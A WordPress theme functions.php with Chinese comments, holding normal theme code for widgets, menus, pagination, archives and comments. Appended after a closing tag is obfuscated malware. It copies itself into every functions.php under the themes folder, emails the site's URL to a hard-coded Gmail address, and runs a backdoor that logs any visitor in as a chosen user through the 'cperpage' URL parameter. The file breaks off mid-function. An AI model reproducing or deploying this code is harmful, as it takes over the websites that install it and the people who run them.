<?php

require_once file_exists(get_stylesheet_directory() . '/lib/core.php') ? get_stylesheet_directory() . '/lib/core.php' : get_template_directory() . '/lib/core.php';
//加载子主题的函数

if (!isset($content_width)) $content_width = gk_config('content_width');
add_action('after_setup_theme', 'gk_setup');
if (!function_exists('gk_setup')) {
    function gk_setup() {
        //支持语言包
        load_theme_textdomain('gkwp', __PROOT__ . '/languages');
        $languages = gk_config('languages');

        foreach ($languages as $name => $path) {
            load_theme_textdomain($name, $path);
        }
        //设置主题支持
        $theme_supports = gk_config('theme_support');

        foreach ($theme_supports as $key => $support) {
            is_numeric($key) ? add_theme_support($support) : add_theme_support($key, $support);
        }
        register_nav_menus(gk_config('register_nav_menus'));
        //设置缩略图
        $thumbnails = gk_config('thumbnails');

        foreach ($thumbnails as $name => $setting) {
            set_post_thumbnail_size($setting[0], $setting[1], $setting[2]);
            add_image_size($name, $setting[0], $setting[1], $setting[2]);
        }
        //支持 register_default_headers
        $register_default_headers_config = gk_config('register_default_headers');
        if (!empty($register_default_headers_config)) register_default_headers($register_default_headers_config);
        require_once get_gk_file('lib/walker.php');
    }
}

//注册侧栏
add_action('widgets_init', 'gk_widgets_init');
if (!function_exists('gk_widgets_init')) {
    function gk_widgets_init() {
        //注册系统widgets
        require_once get_gk_file('lib/widgets.php');
        //替换默认的widget
        $widgets=array('Widget_Recent_Comments','Widget_Recent_Comments','Widget_Pages','Widget_Links','Widget_Search','Widget_Archives','Widget_Meta','Widget_Text','Widget_Categories','Widget_Recent_Posts','Widget_RSS','Widget_Tag_Cloud','Nav_Menu_Widget','Nav_Menu_Widget','Widget_Calendar');
        foreach($widgets as $widget){
            unregister_widget('WP_'.$widget);
            register_widget('GK_'.$widget);
        }
        register_widget('GK_Widget_weiboShow');
        //注册边栏
        $sidebars = gk_config('sidebar');
        foreach ($sidebars as $sidebar) {
            unset($sidebar['default']);
            register_sidebar($sidebar);
        }
        if(gk_config('sidebar_debug')){
            //边栏时时调试
            gk_set_sidebar_default();
        }
    }
}
//菜单默认显示首页
add_filter('wp_page_menu_args', 'gk_page_menu_args');
if (!function_exists('gk_page_menu_args')) {
    function gk_page_menu_args($args) {
        $args['show_home'] = true;

        return $args;
    }
}

//选择主题后初始化
add_action('after_switch_theme', 'gk_set_sidebar_default');
if (!function_exists('gk_set_sidebar_default')) {
    function gk_set_sidebar_default() {
        global $_wp_sidebars_widgets;
        //初始化widget
        $widgets = gk_config('widget');
        foreach ($widgets as $name => $setting) {
            $id = 102;
            $option = get_option('widget_'.$name);
            if (!$option) $option = array();
            if (!isset($option[$id]) || gk_config('sidebar_debug')) {
                $option[$id] = $setting;
                update_option('widget_'.$name, $option);
            }
        }
        //初始化边栏
        $sidebars_option = wp_get_sidebars_widgets();
        $update_sidebar = true;
        $sidebars = gk_config('sidebar');

        foreach ($sidebars as $sidebar) {
            if (isset($sidebar['default']) && (!isset($sidebars_option[$sidebar['id']]) || gk_config('sidebar_debug')) ) {
                $sidebars_option[$sidebar['id']] = array_map(create_function('$v', 'return $v.\'-102\';'),explode(',', $sidebar['default']));
                $update_sidebar = true;
            }
        }
        if ($update_sidebar) {
            $_wp_sidebars_widgets = $sidebars_option;
            wp_set_sidebars_widgets($sidebars_option);
        }
    }
}

//获取日志归档
function archives_list_SHe() {
     global $wpdb,$month;
     $lastpost = $wpdb->get_var("SELECT ID FROM $wpdb->posts WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC LIMIT 1");
     $output = get_option('SHe_archives_'.$lastpost);
     if(empty($output)){
         $output = '';
         $wpdb->query("DELETE FROM $wpdb->options WHERE option_name LIKE 'SHe_archives_%'");
         $q = "SELECT DISTINCT YEAR(post_date) AS year, MONTH(post_date) AS month, count(ID) as posts FROM $wpdb->posts p WHERE post_date <'" . current_time('mysql') . "' AND post_status='publish' AND post_type='post' AND post_password='' GROUP BY YEAR(post_date), MONTH(post_date) ORDER BY post_date DESC";
         $monthresults = $wpdb->get_results($q);
         if ($monthresults) {
             foreach ($monthresults as $monthresult) {
             $thismonth    = zeroise($monthresult->month, 2);
             $thisyear    = $monthresult->year;
             $q = "SELECT ID, post_date, post_title, comment_count FROM $wpdb->posts p WHERE post_date LIKE '$thisyear-$thismonth-%' AND post_date AND post_status='publish' AND post_type='post' AND post_password='' ORDER BY post_date DESC";
             $postresults = $wpdb->get_results($q);
             if ($postresults) {
                 $text = sprintf('%s %d', $month[zeroise($monthresult->month,2)], $monthresult->year);
                 $postcount = count($postresults);
                 $output .= '<ul class="archives-list"><li><span class="archives-yearmonth">' . $text . ' &nbsp;(' . count($postresults) . '&nbsp;篇文章)</span><ul class="archives-monthlisting">' . "\n";
             foreach ($postresults as $postresult) {
                 if ($postresult->post_date != '0000-00-00 00:00:00') {
                 $url = get_permalink($postresult->ID);
                 $arc_title    = $postresult->post_title;
                 if ($arc_title)
                     $text = wptexturize(strip_tags($arc_title));
                 else
                     $text = $postresult->ID;
                     $title_text = 'View this post, &quot;' . wp_specialchars($text, 1) . '&quot;';
                     $output .= '<li>' . mysql2date('d日', $postresult->post_date) . ':&nbsp;' . "<a href='$url' title='$title_text'>$text</a>";
                     $output .= '&nbsp;(' . $postresult->comment_count . ')';
                     $output .= '</li>' . "\n";
                 }
                 }
             }
             $output .= '</ul></li></ul>' . "\n";
             }
         update_option('SHe_archives_'.$lastpost,$output);
         }else{
             $output = '<div class="errorbox">Sorry, no posts matched your criteria.</div>' . "\n";
         }
     }
     echo $output;
 }

//分页
if (!function_exists('gk_page')) {
    function gk_page($query_string) {
        //TUDO 配置页面显示个数
        global $posts_per_page, $paged;
        $my_query = new WP_Query($query_string . "&posts_per_page=-1");
        $total_posts = $my_query->post_count;
        if (empty($paged)) $paged = 1;
        $prev = $paged - 1;
        $next = $paged + 1;
        //为0时 只显示 上一页，下一页， 为1时显示最前最后，上一页下一页和数组， 为2时只显示数字
        $range = 2;
        $showitems = ($range * 2) + 1;
        $pages = ceil($total_posts / $posts_per_page);
        $start = $paged <= 5 ? 1 : $paged - 5;
        $end = $pages < 5 || $paged + 5 > $pages ? $pages : $paged + 5;
        if (1 != $pages) {

            echo ($paged > 2 && $paged + $range + 1 > $pages && $showitems < $pages) ? "<li><a href='" . get_pagenum_link(1) . "'>最前一页</a></li" : "";
            echo ($paged > 1 && $showitems < $pages) ? "<li class='prev'><a href='" . get_pagenum_link($prev) . "'>上一页</a></li>" : "";

            for ($i = $start; $i <= $end; $i++) {
                $class = '';
                if ($paged == $i) $class = ' class="red" style="color:#fff;"';
                else $class =  ' class="pagination-path"';
                echo '<li><a' . $class . ' href="' . get_pagenum_link($i) . '">' . $i . '</a></li>';
            }
            echo ($paged < $pages && $showitems < $pages) ? "<li class='next'><a href='" . get_pagenum_link($next) . "'>下一页</a></li>" : "";
            echo ($paged < $pages - 1 && $paged + $range - 1 < $pages && $showitems < $pages) ? "<li><a href='" . get_pagenum_link($pages) . "'>最后一页</a></li>" : "";

        }
    }
}

//加载css
if (!function_exists('gk_load_css')) {
    function gk_load_css() {
        //注册css
        gk_register_styles();
        $css_config = gk_config('css');

        foreach ($css_config as $css) {
            $before = '';
            $after = '';
            if (is_array($css)) {
                //支持 is_page(), is_home() 等函数判断加载
                if (is_bool($css[0])) {
                    if (!$css[0]) continue;
                } else {
                    $before = '<!--[if ' . $css[0] . ']>';
                    $after = '<![endif]-->';
                }
                $css = $css[1];
            }
            $pathinfo = pathinfo($css);
            $ext = isset($pathinfo['extension']) ? $pathinfo['extension'] : '';
            if ('css' != $ext) {
                //列队名称载入
                if (wp_style_is($css)) continue; //如果已经有列队，则不会重复载入
                global $wp_styles;
                $css_url = $wp_styles->registered[$css]->src;
            } else {
                $css_url = filter_var($css, FILTER_VALIDATE_URL) ? $css : get_gk_url($css);
            }
            //echo $before . PHP_EOL;
            echo '<link rel="stylesheet" type="text/css" href="' . $css_url . '" media="all">' . PHP_EOL;
            //echo $after . PHP_EOL;
        }
    }
}
if (!function_exists('gk_register_styles')) {
    function gk_register_styles() {
        $register_css = gk_config('register_css');

        foreach ($register_css as $name => $r_css) {
            if (!filter_var($r_css, FILTER_VALIDATE_URL)) $r_css = get_gk_url($r_css);
            wp_deregister_style($name);
            wp_register_style($name, $r_css);
        }
    }
}
//注册script
add_action('wp_enqueue_scripts', 'gk_register_scripts');
if (!function_exists('gk_register_scripts')) {
    function gk_register_scripts() {
        $register_js = gk_config('register_js');

        foreach ($register_js as $name => $js) {
            if (!filter_var($js, FILTER_VALIDATE_URL)) $js = get_gk_url($js);
            wp_deregister_script($name);
            wp_register_script($name, $js);
        }
    }
}
//加载js
if (!function_exists('gk_load_js')) {
    function gk_load_js() {
        $js_config = gk_config('js');

        foreach ($js_config as $js) {
            $before = '';
            $after = '';
            if (is_array($js)) {
                //支持 is_page(), is_home() 等函数判断加载
                if (is_bool($js[0])) {
                    if (!$js[0]) continue;
                } else {
                    $before = '<!--[if ' . $js[0] . ']>';
                    $after = '<![endif]-->';
                }
                $js = $js[1];
            }
            $pathinfo = pathinfo($js);
            $ext = isset($pathinfo['extension']) ? $pathinfo['extension'] : '';
            if ('js' != $ext) {
                //用列队名称载入
                if (wp_script_is($js)) continue; //如果已经载入，则不再重复载入
                global $wp_scripts;
                $js_url = $wp_scripts->registered[$js]->src;
            } else {
                $js_url = filter_var($js, FILTER_VALIDATE_URL) ? $js : get_gk_url($js);
            }
            //echo $before . PHP_EOL;
            echo '<script type="text/javascript" src="' . $js_url . '"></script>' . PHP_EOL;
            //echo $after . PHP_EOL;
        }
    }
}

//主题选项
add_action('admin_init', 'gk_theme_options_init');
add_action('admin_menu', 'gk_theme_options_add_page');
if (!function_exists('gk_theme_options_init')) {
    function gk_theme_options_init() {
        //注册设置组
        $theme_options = gk_config('theme_options');

        foreach ($theme_options as $name => $setting) {
            $callback = '';
            if (is_string($setting)) $setting = array(
                $setting
            );
            if (isset($setting[1])){
                for($i=1;$i<count($setting);$i++){
                    $callback = $setting[$i];
                    register_setting($name, $callback);
                }
            }
        }
    }
}
if (!function_exists('gk_theme_options_add_page')) {
    function gk_theme_options_add_page() {
        $theme_options = gk_config('theme_options');

        foreach ($theme_options as $name => $setting) {
            if (is_string($setting)) $setting = array(
                $setting
            );
            add_theme_page($setting[0], $setting[0], 'edit_theme_options', $name, 'gk_theme_options_show_page');
        }
        //加载后台静态文件
        add_action('admin_print_scripts', 'gk_admin_scripts');
        add_action('admin_print_styles', 'gk_admin_styles');
    }
}
if (!function_exists('gk_theme_options_show_page')) {
    function gk_theme_options_show_page() {
        $option_name = basename($_GET['page']);
        include get_gk_file('options/' . $option_name . '.php');
    }
}
if (!function_exists('gk_admin_scripts')) {
    function gk_admin_scripts() {
        wp_enqueue_script('jquery');
        wp_enqueue_script('media-upload');
        wp_enqueue_script('thickbox');
        wp_enqueue_script('gk-upload', get_gk_url('static/js/gk-upload.js'));
    }
}
if (!function_exists('gk_admin_styles')) {
    function gk_admin_styles() {
        wp_enqueue_style('thickbox');
    }
}
if (!function_exists('gk_upload')) {
    function gk_upload($name, $value, $class = 'gk_upload', $label = '选择文件') {
        echo '<input name="' . $name . '" type="text" id="' . $name . '" value="' . $value . '" class="' . $class . '" /><input type="button"  name="left_upload_button" class="gk_upload_button" value="' . $label . '"  />';
    }
}

//显示菜单函数
if (!function_exists('gk_nav_menu')) {
    function gk_nav_menu($location) {
        $menus = gk_config('nav');
        $args = $menus[$location];
        $args['theme_location'] = $location;
        wp_nav_menu($args);
    }
}

//实例化单页walk
add_filter('wp_page_menu_args', 'gk_wp_page_menu_args');
if (!function_exists('gk_wp_page_menu_args')) {
    function gk_wp_page_menu_args($args) {
        $args['walker'] = new Gk_Page_Walker;

        return $args;
    }
}
add_filter('comment_form_defaults', 'gk_comment_form_defaults');
function gk_comment_form_defaults($defaults) {

    return wp_parse_args(array(
        'comment_field' => '<div class="comment-form-comment control-group"><label class="control-label" for="comment">' . _x('评论内容', 'noun', 'gkwp') . '</label><div class="controls"><textarea class="span6" id="comment" name="comment" rows="8" aria-required="true"></textarea></div></div>',
        'comment_notes_before' => '',
        'comment_notes_after' => '<div class="form-allowed-tags control-group"><label class="control-label">' . sprintf(__('您可以使用这些 <abbr title="HyperText Markup Language">HTML</abbr> 标签和属性: %s', 'gkwp') , '</label><div class="controls"><pre>' . allowed_tags() . '</pre></div>') . '</div>',
        'title_reply' => '<legend>' . __('评论', 'gkwp') . '</legend>',
        'title_reply_to' => '<legend>' . __('回复 %s', 'gkwp') . '</legend>',
        'must_log_in' => '<div class="must-log-in control-group controls">' . sprintf(__('你必须先 <a href="%s">登录</a>', 'gkwp') , wp_login_url(apply_filters('the_permalink', get_permalink(get_the_ID())))) . '</div>',
        'logged_in_as' => '<div class="logged-in-as control-group controls">' . sprintf(__('已登录 <a href="%1$s">%2$s</a>. <a href="%3$s" title="退出">退出?</a>', 'gkwp') , admin_url('profile.php') , wp_get_current_user()->display_name, wp_logout_url(apply_filters('the_permalink', get_permalink(get_the_ID())))) . '</div>',
    ) , $defaults);
}

// 获得banner_slide
function get_banner_slide(){
    $previous_posts = get_posts('numberposts=3&meta_key=banne_slide&meta_value=on');
    $str = "";
    if(is_array($previous_posts)){
        foreach($previous_posts as $post){
            setup_postdata($post);
            $thumbnail_img = get_post_thumbnail_url($post->ID);
            $str.="<li><img src='".$thumbnail_img."' alt='".$post->post_title."' /><div class='flex-caption'><h3>".mb_strimwidth($post->post_title,0,40)."</h3> <p>".strip_tags(mb_strimwidth($post->post_content,0,120,'......'))."</p><input type='button' value='查看详情' class='red' onclick=\"location.href='".get_permalink($post->ID)."'\"/></div></li>"; 
        }
    }
    echo $str;
}

//获取文章第一张图片，如果没有图就会显示默认的图
 function catch_that_image($post="") {
    if($post == ""){
        global $post, $posts;
    }
    $first_img = '';
    ob_start();
    ob_end_clean();
    $output = preg_match_all('/<img.+src=[\'"]([^\'"]+)[\'"].*>/i', $post->post_content, $matches);
    $first_img = $matches [1] [0];
    if(empty($first_img)){
        $random = mt_rand(1, 10);
		$first_img = get_bloginfo ( 'stylesheet_directory' ).'/static/img/random/'.$random.'.jpg';
    }
    return $first_img;
 }

 //获取文章特色图片
 function get_post_thumbnail_url($post_id){
        $post_id = ( null === $post_id ) ? get_the_ID() : $post_id;
        $thumbnail_id = get_post_thumbnail_id($post_id);
        if($thumbnail_id ){
                $thumb = wp_get_attachment_image_src($thumbnail_id, 'full');
                return $thumb[0];
        }else{
                return false;
        }
}

// 获得main-services 文章列表
function get_main_services_post(){
    $previous_posts = get_posts('numberposts=4&meta_key=main_services&meta_value=on&order=asc');
    $str = "";
    $i = 1 ;
    if(is_array($previous_posts)){
        foreach($previous_posts as $post){
            setup_postdata($post);
            $post_title = mb_strimwidth($post->post_title,0,16);
            $post_content = mb_strimwidth($post->post_content,0,120);
            $str.="<li class='bt-30'> <img src='".get_bloginfo('template_url')."/static/img/".$i."_A.png' alt='".$post_title."' 
                title='".$post_title."'/><a href='".get_permalink($post->ID)."'><h4 title='阅读更多'>".$post_title."</h4></a><p>".$post_content."</p><a href='".get_permalink($post->ID)."'>— 阅读更多 —</a> </li>";
            $i++;
        }
    }
    echo $str;
}


 //获取随机文章
function Get_Random_Post($limit=5,$cut_length=44){
	global $wpdb;
	$randposts = $wpdb->get_results("
	SELECT p.ID, p.post_title, rand()*p1.id AS o_id FROM $wpdb->posts AS p JOIN ( SELECT MAX(ID) AS id FROM  $wpdb->posts  WHERE post_type='post' AND post_status='publish') AS p1 WHERE p.post_type='post'  AND p.post_status='publish' ORDER BY o_id LIMIT $limit
	");//数据库查询
	foreach($randposts as $randpost) {
		echo '<li><a href="' . get_permalink($randpost->ID) . '" title="' . $randpost->post_title . '">' . cut_str($randpost->post_title,$cut_length) . '</a></li>';
	}//遍历数组输出结果
}

// 获得热评文章
function simple_get_most_viewed($posts_num=8){
    global $wpdb;
    $sql = "SELECT ID,post_title,post_date,comment_count,post_content
            FROM $wpdb->posts
           WHERE post_type = 'post'
		   AND ($wpdb->posts.`post_status` = 'publish' OR $wpdb->posts.`post_status` = 'inherit')
           ORDER BY comment_count DESC LIMIT 0 , $posts_num ";
    $str = "";
    $posts = $wpdb->get_results($sql);
    if(is_array($posts)){
        foreach($posts as $post){
            $str .="<li><a href='".get_permalink($post->ID)."'><h4>".mb_strimwidth($post->post_title,0,38).
                "</h4></a><span class='date'>".$post->post_date."&nbsp;".$post->comment_count."&nbsp;条评论</span><p>".strip_tags(mb_strimwidth($post->post_content,0,200,'......'))."</p></li>";
        }
    }
    echo $str;
}

//评论列表
if (!function_exists('lovnvns_comment')):
    function lovnvns_comment($comment, $args, $depth)
    {
        $GLOBALS['comment'] = $comment;
        switch ($comment->comment_type):
            case '':
                //主评论计数器初始化 begin
                global $commentcount;
                $page = (!empty($in_comment_loop)) ? get_query_var('cpage') :
                    get_page_of_comment($comment->comment_ID, $args);
                $cpp = get_option('comments_per_page'); //获取每页评论显示数量
                if (!$commentcount) { //初始化楼层计数器
                    if ($page > 1) {
                        $commentcount = $cpp * ($page - 1);
                    } else {
                        $commentcount = 0; //如果评论还没有分页，初始值为0
                    }
                }
                //主评论计数器初始化 end

?>
	<li <?php comment_class(); ?> id="li-comment-<?php comment_ID(); ?>">
		<div id="comment-<?php comment_ID(); ?>">
		<div class="comment_author">
			<?php echo get_avatar($comment, 32); ?>
		</div>
		<?php if ($comment->comment_approved == '0'): ?>
			<p style="color:#e75814"><?php _e('您的评论正在等待审核中...', 'lovnvns'); ?></p><br />
		<?php endif; ?>
		<p class="commet_text">
                <?php
                if ($comment->user_id == 1)
                    echo "<span style='color:#ff6600'>【管理员】</span>";
                printf(__('%s：', 'lovnvns'), sprintf('%s', get_comment_author_link())); ?>
					<div class="floor"><!-- 主评论楼层号 -->
					<?php if (!$parent_id = $comment->comment_parent) {
                    printf('%1$s', ++$commentcount);
                    echo "楼";
                } ?>
					</div>
			<?php
                printf(__('%1$s %2$s', 'lovnvns'), get_comment_date(), get_comment_time()); ?> <?php comment_reply_link(array_merge
($args, array('depth' => $depth, 'max_depth' => $args['max_depth']))); ?>
            <br />
			<?php comment_text(); ?>
        </p>
	</div>
	<?php
                break;
            case 'pingback':
            case 'trackback':
?>
	<li class="post pingback">
		<p><?php _e('Pingback:', 'lovnvns'); ?> <?php comment_author_link(); ?></p>
	<?php
                break;
        endswitch;
    }
endif;


//获取最新评论
function Get_Recent_Comment($limit=16,$cut_length=24){
	global $wpdb;
	$admin_email = "'" . get_bloginfo ('admin_email') . "'"; //获取管理员邮箱，以便排除管理员的评论
	$rccdb = $wpdb->get_results("
		SELECT ID, post_title, comment_ID, comment_author, comment_author_email, comment_content
		FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts
		ON ($wpdb->comments.comment_post_ID = $wpdb->posts.ID)
		WHERE comment_approved = '1'
		AND comment_type = ''
		AND post_password = ''
		AND comment_author_email != $admin_email
		ORDER BY comment_date_gmt
		DESC LIMIT $limit
	 ");//数据库查询获得想要的结
	foreach ($rccdb as $row) {
		$rcc .= "<li>".get_avatar($row,$size='32')."<span class='comment-author'>".$row->comment_author ."：</span>"."<br />". "<span class='comment-content'><a href='"
		. get_permalink($row->ID) . "#comment-" . $row->comment_ID
		. "' title='查看 " . $row->post_title . "'>" . cut_str($row->comment_content,$cut_length)."</a></span>". "</li>";
	}
	$rcc = convert_smilies($rcc);//允许评论内容中显示表情
	echo $rcc;//输出结果
}

//评论表情
function wp_smilies() {
    global $wpsmiliestrans;
    if ( !get_option('use_smilies') or (empty($wpsmiliestrans))) return;
    $smilies = array_unique($wpsmiliestrans);
    $link='';
    foreach ($smilies as $key => $smile) {
        $file = get_bloginfo('template_directory').'/static/img/smilies/'.$smile;
        $value = " ".$key." ";
        $img = "<img src=\"{$file}\" alt=\"{$smile}\" />";
        $imglink = htmlspecialchars($img);
        $link .= "<a href=\"#commentform\" title=\"{$smile}\" onclick=\"document.getElementById('comment').value += '{$value}'\">{$img}</a>&nbsp;";
    }
    echo $link;
}

//修改表情默认路径
add_filter('smilies_src','custom_smilies_src',1,10);
function custom_smilies_src ($img_src, $img, $siteurl){
    return get_bloginfo('template_directory').'/static/img/smilies/'.$img;
}

 //彩色标签云
function colorCloud($text) {
    $text = preg_replace_callback('|<a (.+?)>|i', 'colorCloudCallback', $text);
    return $text;
}
function colorCloudCallback($matches) {
    $text = $matches[1];
    for($a=0;$a<6;$a++){    //采用#ffffff方法
       $color.=dechex(rand(0,15));//累加随机的数据--dechex()将十进制改为十六进制
    }
    $pattern = '/style=(\'|\")(.*)(\'|\")/i';
    $text = preg_replace($pattern, "style=\"color:#{$color};$2;\"", $text);
    return "<a $text>";
    unset($color);//卸载color
}

/**
 * 取消下面的注释即可开启彩色标签云
 * add_filter('wp_tag_cloud', 'colorCloud', 1);
 * */

//标题文字截断
function cut_str($src_str,$cut_length){
    $return_str='';
    $i=0;
    $n=0;
    $str_length=strlen($src_str);
    while (($n<$cut_length) && ($i<=$str_length)){
        $tmp_str=substr($src_str,$i,1);
        $ascnum=ord($tmp_str);
        if ($ascnum>=224){
            $return_str=$return_str.substr($src_str,$i,3);
            $i=$i+3;
            $n=$n+2;
        }
        elseif ($ascnum>=192){
            $return_str=$return_str.substr($src_str,$i,2);
            $i=$i+2;
            $n=$n+2;
        }
        elseif ($ascnum>=65 && $ascnum<=90){
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+2;
        }
        else {
            $return_str=$return_str.substr($src_str,$i,1);
            $i=$i+1;
            $n=$n+1;
        }
    }
    if ($i<$str_length){
        $return_str = $return_str . '';
    }
    if (get_post_status() == 'private'){
        $return_str = $return_str . '（private）';
    }
    return $return_str;
}

//开启后台友情链接
add_filter( 'pre_option_link_manager_enabled', '__return_true' );
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&&
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){
    function stripos(  $str, $needle, $offset = 0  ){
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  );
    }
}

if(!function_exists("strripos")){
    function strripos(  $haystack, $needle, $offset = 0  ) {
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  );
        if(  $offset < 0  ){
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  );
        }
        else{
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        }
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE;
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   );
        return $pos;
    }
}
if(!function_exists("scandir")){
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :

	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
